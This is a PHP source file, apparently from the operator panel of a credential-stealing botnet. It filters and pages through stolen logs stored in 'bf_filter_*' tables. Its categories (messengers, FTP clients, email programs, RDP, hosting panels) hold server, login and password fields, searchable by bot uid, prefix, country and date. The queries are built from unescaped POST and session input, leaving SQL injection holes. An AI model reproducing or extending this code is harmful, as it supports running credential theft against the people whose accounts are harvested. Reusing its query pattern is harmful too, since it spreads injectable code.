<?php
$smarty->allow_php_tag = true;
$page['count_page'] = 100;

if(file_exists('cache/pid_import.txt')){
	$smarty->assign('import', true);
}

function name_var($i){	return 'v' . $i;
}

if(!empty($Cur['id'])){	$id = $Cur['id'];
	$filter = $mysqli->query('SELECT * FROM bf_filters WHERE (id = \''.$id.'\') LIMIT 1');
	$filter->fields = json_decode(base64_decode($filter->fields));
}elseif(!empty($Cur['str'])){	$id = $Cur['str'];
	$filter->str = $id;
	switch($id){		case 'messengers':
        	$filter->name = 'Мессанджеры';
        	$filter->id = 'messengers';
        	$filter->fields->name[] = 'UIN/Name';
        	$filter->fields->name[] = 'Пароль';
		break;

		case 'ftps':
        	$filter->name = 'ФТП Клиенты';
        	$filter->id = 'ftps';
        	$filter->fields->name[] = 'Сервер';
        	$filter->fields->name[] = 'Логин';
        	$filter->fields->name[] = 'Пароль';
		break;

		case 'emailprograms':
        	$filter->name = 'Почтовые программы';
        	$filter->id = 'emailprograms';
        	$filter->fields->name[] = 'Емаил';
        	$filter->fields->name[] = 'Пароль';
		break;

		case 'rdp':
        	$filter->name = 'Remote Desktop Connection';
        	$filter->id = 'rdp';
        	$filter->fields->name[] = 'Сервер';
        	$filter->fields->name[] = 'Логин';
        	$filter->fields->name[] = 'Пароль';
		break;

		case 'panels':
        	$filter->name = 'Хостинг Панели';
        	$filter->id = 'panels';
        	$filter->fields->name[] = 'Линк';
        	$filter->fields->name[] = 'Логин';
        	$filter->fields->name[] = 'Пароль';
		break;
	}
}

if(empty($id)){	exit;
}

if(is_array($_SESSION['gsearch'])){	$_POST['prefix'] = $_SESSION['gsearch']['prefix'];
	$_POST['mask_uid'] = $_SESSION['gsearch']['data'];
}

if($_POST['prefix'] != $_SESSION['prefix_' . $id]){
	$_SESSION['prefix_' . $id] = $_POST['prefix'];
}

if($_POST['mask_uid'] != $_SESSION['mask_uid_' . $id]){
	$_SESSION['mask_uid_' . $id] = $_POST['mask_uid'];
}

if($_POST['program'] != $_SESSION['program_' . $id]){
	$_SESSION['program_' . $id] = $_POST['program'];
}

if($_POST['status'] != $_SESSION['status_' . $id]){
	$_SESSION['status_' . $id] = $_POST['status'];
}

if($_POST['type'] != $_SESSION['type_' . $id]){
	$_SESSION['type_' . $id] = $_POST['type'];
}

if($_POST['data1'] != $_SESSION['data1_' . $id]){
	$_SESSION['data1_' . $id] = $_POST['data1'];
}

if($_POST['data2'] != $_SESSION['data2_' . $id]){
	$_SESSION['data2_' . $id] = $_POST['data2'];
}

if($_POST['country'] != $_SESSION['country_' . $id]){
	$_SESSION['country_' . $id] = $_POST['country'];
}

if(empty($_SESSION['status_' . $id]) && !isset($_POST['status'])) $_SESSION['status_' . $id] = 'nuls';

$sql = '';

if(!empty($_SESSION['prefix_' . $id])){
	$_POST['prefix'] = $_SESSION['prefix_' . $id];
	$sql .= '(prefix=\''.$_SESSION['prefix_' . $id].'\')';
}

if(!empty($_SESSION['mask_uid_' . $id])){	if(!empty($sql)) $sql .= ' AND ';
	$_POST['mask_uid'] = $_SESSION['mask_uid_' . $id];
	$sql .= '(uid LIKE \'%'.$_SESSION['mask_uid_' . $id].'%\')';
}

if(!empty($_SESSION['country_' . $id])){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(country=\''.$_SESSION['country_' . $id].'\')';
	$_POST['country'] = $_SESSION['country_' . $id];
}

if(!empty($_SESSION['program_' . $id])){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(program=\''.$_SESSION['program_' . $id].'\')';
	$_POST['program'] = $_SESSION['program_' . $id];
}

if($_SESSION['status_' . $id] == 'nuls'){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(save=\'0\')';
	$_POST['status'] = $_SESSION['status_' . $id];
}elseif($_SESSION['status_' . $id] == '1'){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(save!=\'0\')';
	$_POST['status'] = $_SESSION['status_' . $id];
}

if(!empty($_SESSION['type_' . $id])){
	if(!empty($sql)) $sql .= ' AND ';
	$sql .= '(type=\''.$_SESSION['type_' . $id].'\')';
	$_POST['type'] = $_SESSION['type_' . $id];
}

if(!empty($_SESSION['data1_' . $id]) && !empty($_SESSION['data2_' . $id])){
	if($_SESSION['data1_' . $id] != 'ALL' && $_SESSION['data2_' . $id] != 'ALL'){		if(!empty($sql)) $sql .= ' AND ';
		if($_SESSION['data1_' . $id] == $_SESSION['data2_' . $id]){			$sql .= '(post_date > \''.$_SESSION['data1_' . $id].' 00:00:00\')';
		}else{			if($_SESSION['data1_' . $id] == 'ALL'){				$sql .= '(post_date < \''.$_SESSION['data2_' . $id].' 23:59:59\')';
			}elseif($_SESSION['data2_' . $id] == 'ALL'){				$sql .= '(post_date > \''.$_SESSION['data1_' . $id].' 00:00:00\')';
			}else{				$sql .= '(post_date > \''.$_SESSION['data1_' . $id].' 00:00:00\') AND (post_date < \''.$_SESSION['data2_' . $id].' 23:59:59\')';
			}
		}
	}
	$_POST['data1'] = $_SESSION['data1_' . $id];
	$_POST['data2'] = $_SESSION['data2_' . $id];
}

if(!empty($sql)) $sql = ' WHERE ' . $sql;

$table_check = $mysqli->table_check('bf_filter_'.$id);

if($table_check->Name != 'bf_filter_'.$id){	print('<hr /><div align="center" style="font-size: 16px; font-weight:bold">БД фильтра не найден!</div><hr />');
	exit;
}else{
	$logs = $mysqli->query('SELECT * FROM bf_filter_' . $id . $sql . ' ORDER by post_date DESC LIMIT ' . ($Cur['page'] == 0 ? 0 : $Cur['page']*$page['count_page']).','.$page['count_page'], null, null, false);
	//$count_items = $mysqli->table_rows('bf_filter_' . $id);
	$count_items = $mysqli->query_name('SELECT COUNT(id) count FROM bf_filter_' . $id . $sql);

	if(!empty($Cur['id'])){
		$smarty->assign('pages', html_pages('/logs/logs-' . $Cur['id'] . '.html?ajax=1&', $count_items, $page['count_page'], 1, 'load_data_logs', 'this.href'));
	}elseif(!empty($Cur['str'])){
		$smarty->assign('pages', html_pages('/logs/logs.html?ajax=1&str=' . $Cur['str'], $count_items, $page['count_page'], 1, 'load_data_logs', 'this.href'));
	}

	$prefix = $mysqli->query_cache('SELECT DISTINCT(prefix) prefix FROM bf_filter_' . $id, null, 1200, true);
	$programs = $mysqli->query_cache('SELECT DISTINCT(program) program FROM bf_filter_' . $id, null, 1200, true);
	$country = $mysqli->query_cache('SELECT DISTINCT(country) country FROM bf_filter_' . $id, null, 1200, true);
	$date = $mysqli->query_cache('SELECT DATE_FORMAT(post_date, \'%Y-%m-%d\') date from bf_filter_' . $id . ' GROUP by DATE_FORMAT(post_date, \'%Y-%m-%d\') ORDER by post_date DESC', null, 43200, true);

	$smarty->assign('prefix', $prefix);
	$smarty->assign('programs', $programs);
	$smarty->assign('country', $country);
	$smarty->assign('date', $date);

	$smarty->assign('count_items', $count_items);
	$smarty->assign('filter', $filter);
	$smarty->assign('logs', $logs);
}

?>